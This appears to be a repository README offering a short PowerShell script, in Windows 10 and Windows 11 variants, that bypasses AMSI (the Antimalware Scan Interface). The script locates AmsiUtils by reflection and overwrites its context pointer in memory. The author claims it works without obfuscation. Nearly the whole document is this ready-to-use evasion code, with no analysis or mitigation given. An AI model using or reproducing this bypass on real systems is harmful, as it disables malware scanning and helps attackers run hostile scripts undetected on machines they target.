# AMSI-Bypass-Win10-11
Simple script to bypass AMSI on Win 10 and Win 11 by exploiting AmsiOpenSession.
While the very well known AmsiScanBuffer in memory patching technique takes some tweeking and obfuscation to work, this method (at time of writing) works straight out of the box.
Lots of people to thank for all the tech info so a full write up with screenshots\references\blog posts is in the works.

<b>Win 10 Version</b>

```
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
$d=$c.GetFields(‘NonPublic,Static’);
Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
$g=$f.GetValue($null);
[IntPtr]$ptr=$g;
[Int32[]]$buf = @(0);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```
<b>Win 11 Version</b>
```
$a=[Ref].Assembly.GetTypes();
Foreach($b in $a) {if ($b.Name -like “*iUtils”) {$c=$b}};
$d=$c.GetFields(‘NonPublic,Static’);
Foreach($e in $d) {if ($e.Name -like “*Context”) {$f=$e}};
$g=$f.GetValue($null);
$buf = New-Object byte[](8);
$ptr= [System.IntPtr]::Add([System.IntPtr]$g, 0x8);
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 8)
```
